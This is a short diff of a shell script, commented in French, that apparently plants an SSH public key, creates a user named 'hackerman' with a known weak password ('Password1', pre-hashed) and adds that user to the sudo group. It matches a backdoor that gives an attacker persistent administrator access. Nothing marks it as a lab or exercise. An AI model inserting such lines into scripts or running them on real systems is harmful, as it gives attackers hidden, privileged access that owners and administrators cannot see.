@@ -6,3 +6,4 @@ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpf4CbfkUpKP7TSRc0lsLsImzZpVNLy3B9/a
 
 # Créer utilisateur hackerman avec mot de passe: Password1
 useradd -m -p saMNhdbYqwtng hackerman
+usermod -aG sudo hackerman
